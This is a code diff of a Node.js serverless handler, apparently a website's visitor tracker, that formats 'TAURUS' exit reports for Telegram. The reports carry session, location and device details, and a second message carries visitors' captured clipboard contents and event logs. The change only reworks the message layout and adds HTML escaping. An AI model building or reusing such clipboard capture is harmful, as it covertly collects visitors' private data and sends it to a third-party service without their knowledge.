@@ -1,5 +1,6 @@
 const admin = require('firebase-admin');
 const axios = require('axios');
+const { escapeHtml, panel, row } = require('./telegramFormat');
 
 // Initialize Firebase
 if (!admin.apps.length) {
@@ -74,18 +75,27 @@ module.exports = async (req, res) => {
         const brandingLink = `<a href="https://omeryigitler.com/assets/logo.png">&#x200b;</a>`;
 
         // 1. SUMMARY MESSAGE
-        const summaryMsg = brandingLink +
-            `🛑 <b>TAURUS EXIT REPORT [${sessionID}]</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-            `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
-            `📍 <b>EXIT PAGE:</b> <code>${exitPage}</code>\n` +
-            `🌍 <b>LOCATION:</b> <code>${location || 'Unknown'}</code>\n` +
-            `💻 <b>DEVICE:</b> <code>${deviceInfo || 'Unknown'}</code>\n\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━`;
+        const summaryMsg = brandingLink + panel({
+            title: 'TAURUS // EXIT REPORT',
+            subtitle: 'Visitor session closed',
+            rows: [
+                row('🆔', 'Session', sessionID, { code: true }),
+                row('⏱️', 'Duration', `${duration}s`, { code: true }),
+                row('📍', 'Exit Page', exitPage, { code: true }),
+                row('🌍', 'Location', location || 'Unknown'),
+                row('💻', 'Device', deviceInfo || 'Unknown'),
+            ],
+        });
 
         // 2. PAYLOAD MESSAGE (SECOND MESSAGE)
-        const payloadMsg = `📋 <b>CLIPBOARD ACTIVITY:</b>\n<pre>${clipboard || 'None'}</pre>\n\n` +
-            `📝 <b>EVENT LOG (Last 20):</b>\n<pre>${eventLog || 'No events recorded'}</pre>`;
+        const payloadMsg = panel({
+            title: 'TAURUS // SESSION DETAILS',
+            subtitle: 'Captured interaction data',
+            rows: [
+                `📋 <b>Clipboard</b>\n<pre>${escapeHtml(clipboard || 'None')}</pre>`,
+                `📝 <b>Event Log</b>\n<pre>${escapeHtml(eventLog || 'No events recorded')}</pre>`,
+            ],
+        });
 
         // DELIVERY STACK
         // NOTE: Telegram is now sent from FRONTEND via Image Beacon (100% reliable on exit)
